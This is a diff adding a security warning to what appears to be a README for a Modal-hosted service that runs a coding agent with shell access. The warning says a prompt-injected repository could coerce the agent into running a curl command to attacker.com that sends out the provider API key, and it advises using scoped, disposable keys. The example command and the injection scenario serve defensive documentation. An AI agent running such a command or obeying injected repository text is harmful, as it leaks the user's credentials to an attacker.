@@ -61,6 +61,8 @@ curl -H "Modal-Key: $MODAL_PROXY_TOKEN_ID" \
 
 Any client code that calls this server — scripts, CI jobs, another service — needs the same two headers. `GOOGLE_API_KEY` rides along via `Secret.from_name("looptap-secrets")` and the function forwards it into the subprocess env explicitly.
 
+**Use a scoped/ephemeral provider key.** `POST /analyze-repo` runs opencode in a Modal sandbox with `bash: allow` in [`deploy/opencode.hosted.json`](deploy/opencode.hosted.json) — that's what lets the agent run `git log`, `rg`, etc. The disposable container contains the filesystem blast radius, but the provider key is in the sandbox env and a prompt-injected repo can coerce the agent into running `curl attacker.com?k=$GOOGLE_GENERATIVE_AI_API_KEY`. Best practice: put a rate-limited, short-lived, single-purpose key in `looptap-secrets` (Google AI Studio lets you mint per-project keys), rotate on a schedule, and treat it as "a key you're willing to lose." Never drop your primary Gemini key into this secret.
+
 Browse the DB with datasette:
 
 ```bash
